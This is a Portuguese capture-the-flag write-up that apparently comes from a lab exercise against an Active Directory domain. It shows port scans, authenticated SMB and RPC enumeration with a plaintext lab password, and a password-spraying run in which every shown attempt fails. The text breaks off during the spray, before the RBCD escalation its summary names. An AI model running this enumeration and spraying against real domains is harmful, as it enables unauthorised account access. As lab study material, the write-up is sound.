# 🎯 Relatório de Invasão: Forward

> [!abstract] Resumo 
> **Objetivo:** Mover lateralmente , colher informações e elevar privilégios
> **Vetor de Acesso Inicial:** Senha de t.jones exposta em database.kdbx
> **Vetor de Elevação de Privilégios:** r.williams possuir a mesma senha do t.jones e r.williams tem vetor de ataque rbcd para Administrator.

---

## 🛠️ Ferramentas & Scripts Utilizados
- nmap
- smbclient
- impacket-smb 
- enum4linux
- bloodhound
- bloodhound-python
- smbmap
- rpcclient
- nxc smb
- impacket-addcomputer
- impacket-getST
- impacket-rbcd
- impacket-GetUserSPNs
---

## 🔍 1. Reconhecimento & Mapeamento

### Scan de Portas (Nmap)

> [!example] Output do Nmap -sS

| PORT | SERVICE        |
| ---- | -------------- |
| 53   | domain         |
| 88   | kerberos       |
| 135  | msrpc          |
| 139  | netbios        |
| 389  | ldap           |
| 445  | microsoft-ds   |
| 464  | kpasswd5       |
| 593  | http-rpc-epmap |
| 636  | ldapssl        |
| 3389 | ms-wbt-server  |
> [!example] Output do Nmap -sU

| PORT | SERVICE |
| ---- | ------- |
|      |         |

> [!example] Output do Nmap com -sC e -sV
> 

| PORT | SERVICE/VERSION                                                                                          | INFOS                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ---- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 53   | domain        Simple DNS Plus                                                                            | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 88   | kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 17:35:32Z)                             | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 135  | msrpc         Microsoft Windows RPC                                                                      | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 139  | netbios-ssn   Microsoft Windows netbios-ssn                                                              | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 389  | ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name) | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 445  | microsoft-ds?                                                                                            | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 464  | kpasswd5?                                                                                                | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 593  | ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                        | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 636  | tcpwrapped                                                                                               | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 3268 | ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name) | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 3269 | tcpwrapped                                                                                               | ---                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 3289 | ms-wbt-server Microsoft Terminal Services                                                                |  ssl-cert: Subject: commonName=DC01.ctf.local<br>\| Not valid before: 2026-05-19T02:27:27<br>\|_Not valid after:  2026-11-18T02:27:27<br>\| rdp-ntlm-info: <br>\|   Target_Name: CTF<br>\|   NetBIOS_Domain_Name: CTF<br>\|   NetBIOS_Computer_Name: DC01<br>\|   DNS_Domain_Name: ctf.local<br>\|   DNS_Computer_Name: DC01.ctf.local<br>\|   Product_Version: 10.0.17763<br>\|_  System_Time: 2026-09-17T17:35:40+00:00<br>\|_ssl-date: 2026-09-17T17:36:20+00:00; +1s from scanner time.<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows |

> [!info] Análise do Reconhecimento
> O resultado do -sV e -sC mostrou mais portas por conta que algums serviços poderiam ainda estar subindo quando eu liguei a máquina alvo, mas os serviços mostram ser os característicos de um ambiente Active Directory com LDAP , SMB , kerberos , rpc e netbios.
> Vemos que o domínio é o ctf.local e o domain controller é o DC01.ctf.local.
>
### Enumeração SMB (j.smith)
```
smbmap -H 10.65.146.61 -u 'j.smith' -p 'JSmith@IT2024'
[+] IP: 10.65.146.61:445        Name: DC01.ctf.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Downloads                                               READ ONLY       File drop share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```
Vemos que temos acesso a 3 shares , um deles sendo padrão do windows que é o IPC que é um mecanismo windows que permite que aplicativos se comuniquem , troquem dados e sincronizem suas atividades. Temos acesso também ao NETLOGON ,SYSVOL(gpo's) e Downloads.
#### Downloads
```
smbclient //ctf.local/Downloads -U 'j.smith'                   
Password for [WORKGROUP\j.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 20 06:32:25 2026
  ..                                  D        0  Wed May 20 06:32:25 2026

                7863807 blocks of size 4096. 3586070 blocks available
smb: \> 

```
#### IPC
```
smbclient //ctf.local/IPC$ -U 'j.smith'
Password for [WORKGROUP\j.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> helpo

```

#### NETLOGON
```
smbclient //ctf.local/NETLOGON -U 'j.smith'
Password for [WORKGROUP\j.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 19 22:21:55 2026
  ..                                  D        0  Tue May 19 22:21:55 2026

                7863807 blocks of size 4096. 3586068 blocks available
smb: \> 
```
#### SYSVOL
Contém um Registry.pol que não serve para a gente.

### Enumeração RPC(j.smith)
```
rpcclient -U 'j.smith' ctf.local     
Password for [WORKGROUP\j.smith]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[j.smith] rid:[0x649]
user:[t.jones] rid:[0x64a]
user:[r.williams] rid:[0x64b]
user:[svc.helpdesk] rid:[0x64c]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x456]
```

### Enumeração enum4linux (j.smith)
```
enum4linux -a -u 'j.smith' -p 'JSmith@IT2024' ctf.local
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 17 15:04:30 2026

 =========================================( Target Information )=========================================
                                                                                                                      
Target ........... ctf.local                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... 'j.smith'
Password ......... 'JSmith@IT2024'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on ctf.local )=============================
                                                                                                                      
                                                                                                                      
[E] Can't find workgroup/domain                                                                                       
                                                                                                                      
                                                                                                                      

 =================================( Nbtstat Information for ctf.local )=================================
                                                                                                                      
Looking up status of 10.65.146.61                                                                                     
No reply from 10.65.146.61

 =====================================( Session Check on ctf.local )=====================================
                                                                                                                      
                                                                                                                      
[+] Server ctf.local allows sessions using username 'j.smith', password 'JSmith@IT2024'                               
                                                                                                                      
                                                                                                                      
 ==================================( Getting domain SID for ctf.local )==================================
                                                                                                                      
Domain Name: CTF                                                                                                      
Domain Sid: S-1-5-21-1966530601-3185510712-10604624

[+] Host is part of a domain (not a workgroup)                                                                        
                                                                                                                      
                                                                                                                      
 ====================================( OS information on ctf.local )====================================
                                                                                                                      
                                                                                                                      
[E] Can't get OS info with smbclient                                                                                  
                                                                                                                      
                                                                                                                      
[+] Got OS info for ctf.local from srvinfo:                                                                           
        CTF.LOCAL      Wk Sv PDC Tim NT                                                                               
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 =========================================( Users on ctf.local )=========================================
                                                                                                                      
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfba RID: 0x649 acb: 0x00000210 Account: j.smith        Name: (null)    Desc: IT Staff
index: 0xf10 RID: 0x1f6 acb: 0x00000211 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfbc RID: 0x64b acb: 0x00000210 Account: r.williams     Name: (null)    Desc: Help Desk Senior
index: 0xfbd RID: 0x64c acb: 0x00040210 Account: svc.helpdesk   Name: (null)    Desc: HelpDesk Service Acct
index: 0xfbb RID: 0x64a acb: 0x00000210 Account: t.jones        Name: (null)    Desc: Help Desk

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[j.smith] rid:[0x649]
user:[t.jones] rid:[0x64a]
user:[r.williams] rid:[0x64b]
user:[svc.helpdesk] rid:[0x64c]

 ===================================( Share Enumeration on ctf.local )===================================
                                                                                                                      
do_connect: Connection to ctf.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Downloads       Disk      File drop share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on ctf.local                                                                             
                                                                                                                      
//ctf.local/ADMIN$      Mapping: DENIED Listing: N/A Writing: N/A                                                     
//ctf.local/C$  Mapping: DENIED Listing: N/A Writing: N/A
//ctf.local/Downloads   Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                        
                                                                                                                      
NT_STATUS_NO_SUCH_FILE listing \*                                                                                     
//ctf.local/IPC$        Mapping: N/A Listing: N/A Writing: N/A
//ctf.local/NETLOGON    Mapping: OK Listing: OK Writing: N/A
//ctf.local/SYSVOL      Mapping: OK Listing: OK Writing: N/A

 =============================( Password Policy Information for ctf.local )=============================
                                                                                                                      
                                                                                                                      

[+] Attaching to ctf.local using j.smith:JSmith@IT2024

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:CTF.LOCAL)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] CTF
        [+] Builtin

[+] Password Info for Domain: CTF

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                  
                                                                                                                      
                                                                                                                      
Password Complexity: Enabled                                                                                          
Minimum Password Length: 7


 ========================================( Groups on ctf.local )========================================
                                                                                                                      
                                                                                                                      
[+] Getting builtin groups:                                                                                           
                                                                                                                      
group:[Server Operators] rid:[0x225]                                                                                  
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                               
                                                                                                                      
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users                    
Group: Administrators' (RID: 544) has member: CTF\Administrator
Group: Administrators' (RID: 544) has member: CTF\Enterprise Admins
Group: Administrators' (RID: 544) has member: CTF\Domain Admins
Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
Group: Guests' (RID: 546) has member: CTF\Guest
Group: Guests' (RID: 546) has member: CTF\Domain Guests
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: CTF\Domain Users
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Group: Remote Desktop Users' (RID: 555) has member: CTF\j.smith
Group: Remote Desktop Users' (RID: 555) has member: CTF\t.jones
Group: Remote Desktop Users' (RID: 555) has member: CTF\r.williams

[+]  Getting local groups:                                                                                            
                                                                                                                      
group:[Cert Publishers] rid:[0x205]                                                                                   
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x455]
group:[sysadmin] rid:[0x64d]
group:[AppLocker-Restricted] rid:[0x64e]

[+]  Getting local group memberships:                                                                                 
                                                                                                                      
Group: sysadmin' (RID: 1613) has member: CTF\r.williams                                                               
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\krbtgt
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Domain Controllers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Schema Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Enterprise Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Cert Publishers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Domain Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Group Policy Creator Owners
Group: Denied RODC Password Replication Group' (RID: 572) has member: CTF\Read-only Domain Controllers
Group: AppLocker-Restricted' (RID: 1614) has member: CTF\j.smith
Group: AppLocker-Restricted' (RID: 1614) has member: CTF\t.jones

[+]  Getting domain groups:                                                                                           
                                                                                                                      
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                           
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x456]

[+]  Getting domain group memberships:                                                                                
                                                                                                                      
Group: 'Domain Guests' (RID: 514) has member: CTF\Guest                                                               
Group: 'Domain Controllers' (RID: 516) has member: CTF\DC01$
Group: 'Group Policy Creator Owners' (RID: 520) has member: CTF\Administrator
Group: 'Domain Users' (RID: 513) has member: CTF\Administrator
Group: 'Domain Users' (RID: 513) has member: CTF\krbtgt
Group: 'Domain Users' (RID: 513) has member: CTF\j.smith
Group: 'Domain Users' (RID: 513) has member: CTF\t.jones
Group: 'Domain Users' (RID: 513) has member: CTF\r.williams
Group: 'Domain Users' (RID: 513) has member: CTF\svc.helpdesk
Group: 'Enterprise Admins' (RID: 519) has member: CTF\Administrator
Group: 'Domain Admins' (RID: 512) has member: CTF\Administrator
Group: 'Schema Admins' (RID: 518) has member: CTF\Administrator

 ====================( Users on ctf.local via RID cycling (RIDS: 500-550,1000-1050) )====================
                                                                                                                      
                                                                                                                      
[I] Found new SID:                                                                                                    
S-1-5-21-1966530601-3185510712-10604624                                                                               

[I] Found new SID:                                                                                                    
S-1-5-21-1966530601-3185510712-10604624                                                                               

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-32                                                                                                              

[I] Found new SID:                                                                                                    
S-1-5-21-1966530601-3185510712-10604624                                                                               

[I] Found new SID:                                                                                                    
S-1-5-21-1966530601-3185510712-10604624                                                                               

[I] Found new SID:                                                                                                    
S-1-5-21-1966530601-3185510712-10604624                                                                               

[+] Enumerating users using SID S-1-5-21-1966530601-3185510712-10604624 and logon username 'j.smith', password 'JSmith@IT2024'                                                                                                              
                                                                                                                      
S-1-5-21-1966530601-3185510712-10604624-500 CTF\Administrator (Local User)                                            
S-1-5-21-1966530601-3185510712-10604624-501 CTF\Guest (Local User)
S-1-5-21-1966530601-3185510712-10604624-502 CTF\krbtgt (Local User)
S-1-5-21-1966530601-3185510712-10604624-512 CTF\Domain Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-513 CTF\Domain Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-514 CTF\Domain Guests (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-515 CTF\Domain Computers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-516 CTF\Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-517 CTF\Cert Publishers (Local Group)
S-1-5-21-1966530601-3185510712-10604624-518 CTF\Schema Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-519 CTF\Enterprise Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-520 CTF\Group Policy Creator Owners (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-521 CTF\Read-only Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-522 CTF\Cloneable Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-525 CTF\Protected Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-526 CTF\Key Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-527 CTF\Enterprise Key Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-1008 CTF\DC01$ (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username 'j.smith', password 'JSmith@IT2024'                       
                                                                                                                      
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                     
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-80 and logon username 'j.smith', password 'JSmith@IT2024'                       
                                                                                                                      
                                                                                                                      
[+] Enumerating users using SID S-1-5-90 and logon username 'j.smith', password 'JSmith@IT2024'                       
                                                                                                                      
                                                                                                                      
[+] Enumerating users using SID S-1-5-21-1291327596-3633868182-378102486 and logon username 'j.smith', password 'JSmith@IT2024'                                                                                                             
                                                                                                                      
S-1-5-21-1291327596-3633868182-378102486-500 DC01\Administrator (Local User)                                          
S-1-5-21-1291327596-3633868182-378102486-501 DC01\Guest (Local User)
S-1-5-21-1291327596-3633868182-378102486-503 DC01\DefaultAccount (Local User)
S-1-5-21-1291327596-3633868182-378102486-504 DC01\WDAGUtilityAccount (Local User)
S-1-5-21-1291327596-3633868182-378102486-513 DC01\None (Domain Group)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'j.smith', password 'JSmith@IT2024'                                                                                                  
                                                                                                                      
                                                                                                                      
 =================================( Getting printer info for ctf.local )=================================
                                                                                                                      
result was WERR_INVALID_NAME                                                                                          


enum4linux complete on Thu Sep 17 15:29:48 2026

```
Aqui vemos informações importantes como os usuários de cada grupo , listagem de grupos , usuários e assim vemos que podemos logar via RDP pois esse grupo provavelmente indica a nossa capacidade de fazr isso com j.smith.

### Pulverização de senha seguindo o padrão do j.smith
```
nxc smb ctf.local -u users.txt -p senha.txt --continue-on-success
SMB         10.65.146.61    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2024 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2023 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:RWilliams@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HD2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\svc.helpdesk:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\Administrator:TJones@HelpDesk2025 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\t.jones:RWilliams@HD2026 STATUS_LOGON_FAILURE 
SMB         10.65.146.61    445    DC01             [-] ctf.local\r.williams:RWilliams@HD2026 STATUS_LOGON_FAILURE 
